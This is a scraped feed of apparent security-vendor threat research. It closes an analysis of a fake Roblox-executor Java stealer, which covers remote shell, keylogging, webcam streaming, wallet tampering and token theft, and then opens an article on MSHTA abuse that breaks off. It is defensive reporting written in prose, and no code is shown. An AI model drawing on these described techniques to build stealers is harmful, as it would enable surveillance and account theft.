\u003Cstrong\u003ECommand execution\u003C\u002Fstrong\u003E is performed by launching a PowerShell process that executes a Base64-encoded command received as a parameter.\u003C\u002Fp\u003E\u003Cp\u003EThe \u003Cstrong\u003Einteractive shell\u003C\u002Fstrong\u003E is implemented in a similar way, using a PowerShell process whose input and output are redirected to the Java process, which then forwards the buffers to the C2 server.\u003C\u002Fp\u003E\u003Ch3 id=\"surveillance-capabilities\"\u003ESurveillance Capabilities\u003C\u002Fh3\u003E\u003Cp\u003EThe surveillance command set includes keylogging, mouse movement logging, screenshot capture, display streaming, and webcam capture.\u003C\u002Fp\u003E\u003Cp\u003EWebcam capture is performed by interacting with COM objects related to DirectShow. The captured buffers are then streamed to the C2 server.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-116D7363-3F5C-4B9D-8D04-0C86867BCEFA--20260709-143158.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"938\" height=\"851\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-116D7363-3F5C-4B9D-8D04-0C86867BCEFA--20260709-143158.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-116D7363-3F5C-4B9D-8D04-0C86867BCEFA--20260709-143158.png 938w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 19. DirectShow-related GUIDs\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EDisplay monitoring can be performed in two ways: the malware can either capture individual screenshots using the \u003Cem\u003EscreenshotCapture \u003C\u002Fem\u003Ecommand or enable a streaming mode that captures a screenshot every 500 milliseconds and continuously sends the images to the C2 server, effectively creating a live feed.\u003C\u002Fp\u003E\u003Cp\u003EThe server can also request a list of connected displays in order to choose which one to capture.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-E8B57B90-879C-49B4-89AE-384A7452B376--20260709-144455.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1065\" height=\"170\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-E8B57B90-879C-49B4-89AE-384A7452B376--20260709-144455.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F08\u002F-E8B57B90-879C-49B4-89AE-384A7452B376--20260709-144455.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-E8B57B90-879C-49B4-89AE-384A7452B376--20260709-144455.png 1065w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 20. Streaming screenshots every 500 milliseconds\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EMouse and keyboard logging are implemented through \u003Cem\u003EWinuser \u003C\u002Fem\u003Efrom the Java Native Access API. This allows the malware to interface with Windows functions from \u003Cem\u003EUser32 \u003C\u002Fem\u003Eand register hooks for mouse and keyboard events.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-0158CE95-ABF2-4BEB-A372-1F1C14CE925A--20260709-144743.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"344\" height=\"259\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 12. Mouse events logged\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-C9B8B546-A104-41D5-9360-8BC6ACE7810F--20260709-150005.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"483\" height=\"810\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 22. Strings mapped to key codes\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Ch3 id=\"personal-information-theft\"\u003EPersonal Information Theft\u003C\u002Fh3\u003E\u003Cp\u003EPersonal information theft begins with the malware gathering information about potentially interesting software installed on the victim’s system. This allows the operators to adapt their strategy and prioritize which data to steal. \u003C\u002Fp\u003E\u003Cp\u003EThe function we named \u003Cem\u003EmapInterestingSoftware \u003C\u002Fem\u003Echecks standard installation paths for various applications and stores the results in a HashMap. Once the checks are complete, the contents of the HashMap are sent to the C2 server.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-8AD5A219-80D5-4961-BB51-1AA833A0C7C1--20260709-150733.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"914\" height=\"222\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-8AD5A219-80D5-4961-BB51-1AA833A0C7C1--20260709-150733.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-8AD5A219-80D5-4961-BB51-1AA833A0C7C1--20260709-150733.png 914w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 23. Example software mapping\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe checked software includes crypto wallets such as:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003EExodus, Atomic, Cake Wallet, SafePal, TronWallet, and Monero Wallet\u003C\u002Fli\u003E\n\u003Cli\u003ESoftware development tools such as Visual Studio, Git, JetBrains tools, and Python IDLE\u003C\u002Fli\u003E\n\u003Cli\u003EGame launchers such as Steam, Rockstar Games Launcher, Battle.net, Epic Games Launcher, and Riot Client\u003C\u002Fli\u003E\n\u003Cli\u003ERoblox and Minecraft installations\u003C\u002Fli\u003E\n\u003Cli\u003EVPN software such as NordVPN, Mullvad VPN, ExpressVPN, and Surfshark\u003C\u002Fli\u003E\n\u003Cli\u003EMessaging software such as Telegram, Snapchat, WhatsApp, and Discord\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EAfter this initial discovery phase, the stealer uses dedicated functions for some of its main targets.\u003C\u002Fp\u003E\u003Cp\u003EThe stealer implements one wallet-specific attack against Exodus cryptocurrency wallets.\u003C\u002Fp\u003E\u003Cp\u003EThis logic is handled by the two threads instantiated by the main function. The first thread checks whether Exodus version 26.1.5 is installed on the system. If the wallet is present, the malware extracts the app.asar file, injects two small JavaScript snippets into the application’s files and repacks them.\u003C\u002Fp\u003E\u003Cp\u003EOne of the scripts modifies the wallet’s sandboxing and context isolation configuration, while the other logs wallet-related buffers to a file named \u003Cem\u003ESquirrelInteractive.bin\u003C\u002Fem\u003E in the user’s home directory.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-AAC6D5A2-145A-48CB-8627-F0D7B56D46FB--20260710-063425.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"952\" height=\"216\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-AAC6D5A2-145A-48CB-8627-F0D7B56D46FB--20260710-063425.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-AAC6D5A2-145A-48CB-8627-F0D7B56D46FB--20260710-063425.png 952w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 24. Validating if Exodus 26.1.5 is installed\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-F808F7F6-0AA1-4463-945E-EAB27D0A221E--20260710-063837.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"967\" height=\"95\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-F808F7F6-0AA1-4463-945E-EAB27D0A221E--20260710-063837.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-F808F7F6-0AA1-4463-945E-EAB27D0A221E--20260710-063837.png 967w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 25. JavaScript injection in Exodus files\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThis approach suggests that the malware is not simply searching for static wallet files, but rather actively tampering with the local Exodus application to expose sensitive runtime data. The second thread periodically checks for the presence of \u003Cem\u003ESquirrelInteractive.bin\u003C\u002Fem\u003E.\u003C\u002Fp\u003E\u003Cp\u003EIf the file exists, it parses the logged contents, extracts valid tokens, and sends them to the C2 server.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-DE0AFCEB-D98B-47B7-B768-213A082B2355--20260710-064105.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"967\" height=\"400\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-DE0AFCEB-D98B-47B7-B768-213A082B2355--20260710-064105.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-DE0AFCEB-D98B-47B7-B768-213A082B2355--20260710-064105.png 967w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 26. Wallet Data collector\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EFor browser collection, the malware defines custom classes for each supported browser, including specific paths where potentially valuable information is stored, such as cookies and user data.\u003C\u002Fp\u003E\u003Cp\u003EThe browsers recognized by the malware are Brave Browser, Chrome, Edge, Opera, Opera GX, and Vivaldi.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-E47E50E7-C197-4044-8A9E-C603EE977ED0--20260709-151912.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"766\" height=\"405\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-E47E50E7-C197-4044-8A9E-C603EE977ED0--20260709-151912.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-E47E50E7-C197-4044-8A9E-C603EE977ED0--20260709-151912.png 766w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 27. Brave Browser definitions\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EDiscord token theft is performed in two steps. First, the malware checks browser cookies for saved tokens associated with discord[.]com and extracts information stored in browser SQLite databases.\u003C\u002Fp\u003E\u003Cp\u003EIt then uses the Discord API to retrieve information about the logged-in account, including stored payment methods.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-994720C0-2D09-4965-9D59-42BFF40BC4B1--20260709-152920.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1353\" height=\"867\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-994720C0-2D09-4965-9D59-42BFF40BC4B1--20260709-152920.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F08\u002F-994720C0-2D09-4965-9D59-42BFF40BC4B1--20260709-152920.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-994720C0-2D09-4965-9D59-42BFF40BC4B1--20260709-152920.png 1353w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 28. Discord account retrieval\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003ERoblox and Minecraft cookies are also processed to retrieve account and login information. For Minecraft, the malware can identify multiple launchers and extract sensitive information stored by each of them.\u003C\u002Fp\u003E\u003Cp\u003EThe known launchers are Feather, Lunar, Meteor, Modrinth, Prism, and the official Minecraft launcher.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-3812DA1D-A4F9-49B2-9CE2-FB3D8A9270B7--20260709-153221.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"799\" height=\"380\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-3812DA1D-A4F9-49B2-9CE2-FB3D8A9270B7--20260709-153221.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-3812DA1D-A4F9-49B2-9CE2-FB3D8A9270B7--20260709-153221.png 799w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 29. Roblox cookie parsing\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-AEAAB802-4D7C-4E85-9A6F-717BBD361401--20260709-153329.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"777\" height=\"184\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-AEAAB802-4D7C-4E85-9A6F-717BBD361401--20260709-153329.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-AEAAB802-4D7C-4E85-9A6F-717BBD361401--20260709-153329.png 777w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 30. Minecraft cookie parsing\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EFinally, the malware can extract tokens from Microsoft Store logins with the goal of stealing stored payment information. It locates .tbres files in the Token Broker or Cache directories and searches their contents for patterns that indicate the beginning of a token.\u003C\u002Fp\u003E\u003Cp\u003EAny valid token found is sent to the C2 server.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002Fimage-3.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1186\" height=\"507\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002Fimage-3.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F08\u002Fimage-3.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002Fimage-3.png 1186w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 31. Microsoft Store token theft\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Ch1 id=\"impact-on-victims\"\u003EImpact on Victims\u003C\u002Fh1\u003E\u003Cp\u003EThe malware can severely impact victims’ privacy because it gives attackers access to both stored personal information and real-time activity.\u003C\u002Fp\u003E\u003Cp\u003EIn addition to stealing browser cookies, account credentials, cryptocurrency-wallet data, and payment-related tokens, it can record keystrokes and mouse activity, capture screenshots, stream the desktop, access the webcam, and remotely browse or modify files.\u003C\u002Fp\u003E\u003Cp\u003EThis combination enables attackers to observe private conversations, collect sensitive images and documents, impersonate victims, take over online accounts, and possibly inflict financial loss.\u003C\u002Fp\u003E\u003Cp\u003EIts remote-access and command-execution capabilities also mean that the compromise can continue beyond the initial theft of information, which can lead to data destruction or allow operators to use the infected system in other cyber-criminal activities.\u003C\u002Fp\u003E\u003Ch1 id=\"conclusions\"\u003EConclusions\u003C\u002Fh1\u003E\u003Cp\u003EGaming-related lures remain effective because they exploit users’ interest in gaining an advantage, accessing restricted functionality, or avoiding anti-cheat detection.\u003C\u002Fp\u003E\u003Cp\u003EIn this campaign, attackers used a convincing imitation of the Xeno Roblox script executor and promoted it through channels commonly used by gaming communities. Familiar filenames, copied scripts, legitimate-looking directories, and Windows-related persistence names helped the infection chain appear credible while concealing its malicious purpose.\u003C\u002Fp\u003E\u003Cp\u003EThe delivered malware is considerably more capable than a typical credential stealer. Its final stage combines browser and account theft with cryptocurrency-wallet targeting, payment-token collection, keylogging, screenshots, webcam access, desktop streaming, file operations, PowerShell command execution, and interactive shell access.\u003C\u002Fp\u003E\u003Cp\u003EPersistence and self-update functionality allow the operators to maintain control over infected systems and deploy new versions, while newly observed infrastructure and capabilities indicate that the campaign remains active and continues to evolve.\u003C\u002Fp\u003E\u003Cp\u003EUsers can reduce their exposure by combining effective security controls with cautious online behavior.\u003C\u002Fp\u003E\u003Cp\u003EUpdated endpoint protection, reputation-based blocking, application-control policies, multi-factor authentication, and restrictions on software execution can prevent or limit many stages of the attack.\u003C\u002Fp\u003E\u003Cp\u003EHowever, the most effective first line of defense remains avoiding unofficial cheats and executors, particularly those distributed through untrusted websites, archives, forums, or unsolicited Discord messages.\u003C\u002Fp\u003E\u003Cp\u003ERecognizing these lures before execution can prevent account theft, financial loss, and complete system compromise. Discussing common gaming-related scams with younger users can also significantly reduce the risk of infection.\u003C\u002Fp\u003E\u003Ch1 It also includes limited functionality that currently is available in Stage 3 samples (only listening for OS commands (executed with  exec) ), which reinforces our assumption that the malware was in de","\u002Fblog\u002Flabs\u002Finfected-minecraft-mods-lead-to-multi-stage-multi-platform-infostealer-malware\u002F","6a0b1dc6a89a0404d6eab60a","Microsoft’s MSHTA Legacy Tool Still Powers Malware Campaigns on Windows","microsofts-mshta-legacy-malware-windows","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fmshta_flat_vector_3000w.png","2026-05-19T15:58:25.000+03:00","\u003Cp\u003E\u003Cem\u003EBitdefender security researchers have discovered that attackers continue to exploit Microsoft HTML Application Host (MSHTA), a legacy utility available by default on Windows systems that can execute VBScript and JavaScript from local or remote files.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003ECybercriminals abuse legitimate, albeit legacy, tools to push a host of malware, ranging from run-of-the-mill password stealers to advanced threats. Bitdefender’s previous investigations already revealed how attackers used LOTL tactics in a Windows and macOS malware campaign that leveraged fake “Claude Code” Google ads.\u003C\u002Fp\u003E\u003Cp\u003E“ClickFix” attacks were also used with a new LummaStealer and CastleLoader campaign, not to mention the malware used to infect the devices of people who downloaded pirated versions of Leonardo DiCaprio’s new film, One Battle After Another.\u003C\u002Fp\u003E\u003Ch2 id=\"key-findings\"\u003EKey findings\u003C\u002Fh2\u003E\u003Cul\u003E\n\u003Cli\u003EMSHTA remains a widely abused Living-off-the-Land binary (LOLBIN) despite being a legacy utility.\u003C\u002Fli\u003E\n\u003Cli\u003EAttackers use it across multiple malware categories, from commodity stealers to advanced threats.\u003C\u002Fli\u003E\n\u003Cli\u003ECampaigns frequently rely on multi-stage, fileless execution chains involving PowerShell and HTA scripts.\u003C\u002Fli\u003E\n\u003Cli\u003ESocial engineering plays a critical role, including fake software downloads and ClickFix-style lures.\u003C\u002Fli\u003E\n\u003Cli\u003EEffective defense requires both user awareness and layered technical controls.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EMicrosoft announced the deprecation of \u003Ca href=\"https:\u002F\u002Ftechcommunity.microsoft.com\u002Fblog\u002Fwindows-itpro-blog\u002Fvbscript-deprecation-timelines-and-next-steps\u002F4148301\" rel=\"noreferrer\"\u003EVBScript in the second half of 2024\u003C\u002Fa\u003E, making it available as a Feature On Demand, enabled by default. In 2027, this feature will be disabled by default, and Microsoft plans to remove it entirely from Windows.\u003C\u002Fp\u003E\u003Cp\u003EWe analyzed how attackers continue to abuse MSHTA, another legacy utility that remains available by default on Windows systems and can execute VBScript and JavaScript from local or remote files.\u003C\u002Fp\u003E\u003Cp\u003EIn recent months, we noticed an increase in detections of mshta.exe in the execution chain, indicating that it remains a relevant Living-off-the-Land binary even after standalone Internet Explorer was retired.\u003C\u002Fp\u003E\u003Cp\u003EThe activity we analyzed spans multiple malware categories.\u003C\u002Fp\u003E\u003Cp\u003EAt the lower end, MSHTA is heavily used in delivery chains for commodity stealers such as LummaStealer and Amatera, as well as loaders such as CountLoader and Emmenhtal Loader.\u003C\u002Fp\u003E\u003Cp\u003EAt the same time, it also shows up in more advanced and persistent malware campaigns, including ClipBanker and PurpleFox. This range of abuse highlights why MSHTA continues to matter to defenders: it’s not a single malware family or intrusion model. It remains useful across the spectrum from opportunistic malware delivery to long-lived compromise.\u003C\u002Fp\u003E\u003Cp\u003EDuring this investigation, we also identified recently introduced domain patterns for an HTA-based loader called CountLoader that delivers commodity malware.\u003C\u002Fp\u003E\u003Ch2 id=\"introduction\"\u003EIntroduction\u003C\u002Fh2\u003E\u003Cp\u003EAlthough Internet Explorer reached end of support on June 15, 2022, Microsoft Edge still includes an IE mode to ensure backward compatibility, with support promised at least until 2029 [2].\u003C\u002Fp\u003E\u003Cp\u003EThis reveals a broader security problem: even after companies retire legacy products, parts of their ecosystem can persist in Windows for years, supporting older workflows and enterprise compatibility requirements.\u003C\u002Fp\u003E\u003Cp\u003E&nbsp;Threat actors frequently abuse trusted, preinstalled Windows binaries to execute malicious content while relying on software already present on the system.\u003C\u002Fp\u003E\u003Cp\u003EThese binaries, commonly referred to as Living-off-the-Land binaries (LOLBINs), are valuable because they help attackers reduce the need to drop custom tools, blend into legitimate system activity, and make malicious chains harder to distinguish from benign administrative activity.\u003C\u002Fp\u003E\u003Cp\u003EMshta.exe is just one of these utilities, originally associated with Internet Explorer and capable of running HTML Applications (HTA) using the Internet Explorer rendering engine.\u003C\u002Fp\u003E\u003Cp\u003EHTA files can embed JavaScript and VBScript code, allowing script execution in the context of a trusted, signed process. Legacy components that many users consider obsolete can still serve as a convenient execution path for modern malware.\u003C\u002Fp\u003E\u003Cp\u003EThere is currently no public indication that this utility will also be removed from future versions of Windows. As long as it remains available by default, MSHTA remains relevant both as a residual administrative tool and as part of the exposed attack surface.\u003C\u002Fp\u003E\u003Ch2 id=\"legitimate-use\"\u003ELegitimate use\u003C\u002Fh2\u003E\u003Cp\u003EAlthough MSHTA is a legacy utility with more modern alternatives that offer similar capabilities, some system administrators and software developers still use it to alert users to updates or to display simple web applications without opening a browser.\u003C\u002Fp\u003E\u003Cp\u003EAround 10% of our MSHTA telemetry still consists of simple one-liner scripts that notify users about administrative tasks via javascript:alert() or vbscript:msgbox().\u003C\u002Fp\u003E\u003Cp\u003EAnother small portion of our MSHTA insights comes from seemingly legitimate login scripts executed through MSHTA one-liners that create a WScript.Shell object and run a local file in its context.\u003C\u002Fp\u003E\u003Cp\u003EThis remaining legitimate usage is important because it shows that MSHTA has not disappeared completely from real-world environments.\u003C\u002Fp\u003E\u003Cp\u003EAt the same time, these use cases are steadily becoming less common, and there are far more modern and legitimate ways to automate system administration tasks.\u003C\u002Fp\u003E\u003Cp\u003ETo accelerate this reduction in MSHTA use, we generally recommend moving away from MSHTA in administrative workflows wherever possible.\u003C\u002Fp\u003E\u003Ch3 id=\"mshta-as-a-lolbin\"\u003EMSHTA as a Lolbin\u003C\u002Fh3\u003E\u003Cp\u003ELOLBINs (Living-off-the-Land binaries) are attractive to attackers because they are signed, familiar, and often implicitly trusted within enterprise environments. When abused, they can help adversaries execute code, retrieve remote payloads, and progress an intrusion without immediately relying on obviously malicious binaries.\u003C\u002Fp\u003E\u003Cp\u003EMSHTA still fits this model well [10]. It is present by default on Windows systems, can execute script content in-memory, and can retrieve content from remote locations. These properties make it useful for stagers and loaders, allowing attackers to minimize on-disk artifacts and take advantage of a legitimate Microsoft-signed process during execution.\u003C\u002Fp\u003E\u003Cp\u003ESince the start of the year, we have observed an increase in MSHTA-related activity. Given that legitimate use of this utility is gradually fading, this trend likely reflects a rise in malicious activity rather than renewed administrative adoption.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002F54ed49af-d50b-4124-9a16-6e5a4b40a7e4.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1330\" height=\"122\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002F54ed49af-d50b-4124-9a16-6e5a4b40a7e4.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F05\u002F54ed49af-d50b-4124-9a16-6e5a4b40a7e4.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002F54ed49af-d50b-4124-9a16-6e5a4b40a7e4.png 1330w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EIn the following sections, we’ll reveal the most prominent campaigns from our insights and show how threat actors continue to adapt MSHTA-based attacks to deliver commodity malware at scale.\u003C\u002Fp\u003E\u003Ch2 id=\"campaigns-employing-mshta\"\u003ECampaigns employing MSHTA\u003C\u002Fh2\u003E\u003Cp\u003EThe MSHTA activity we analyzed spans multiple types of malware, including commodity information stealers such as LummaStealer and Amatera, multi-stage loaders such as CountLoader and Emmenhtal Loader, banking malware such as ClipBanker, and more persistent threats such as PurpleFox.\u003C\u002Fp\u003E\u003Cp\u003EAcross these campaigns, MSHTA serves a similar purpose: it provides attackers with a built-in, Microsoft-signed utility that can retrieve and execute remote script content during the initial or intermediate stages of an infection chain.\u003C\u002Fp\u003E\u003Cp\u003EThis makes MSHTA especially useful for malware delivery. In some cases, it is used to launch HTA-based loaders directly from attacker-controlled infrastructure. In others, it is embedded into broader chains involving phishing, fake software installers, ClickFix-style lures or scripted downloaders.\u003C\u002Fp\u003E\u003Cp\u003EOur insights show that MSHTA most commonly appeared in campaigns that delivered stealers and loaders. This is significant because these malware families are often used to gain an initial foothold, steal credentials and browser-stored data, hijack sessions, and deliver additional payloads that can deepen the compromise.\u003C\u002Fp\u003E\u003Cp\u003EThis means that what may begin as the 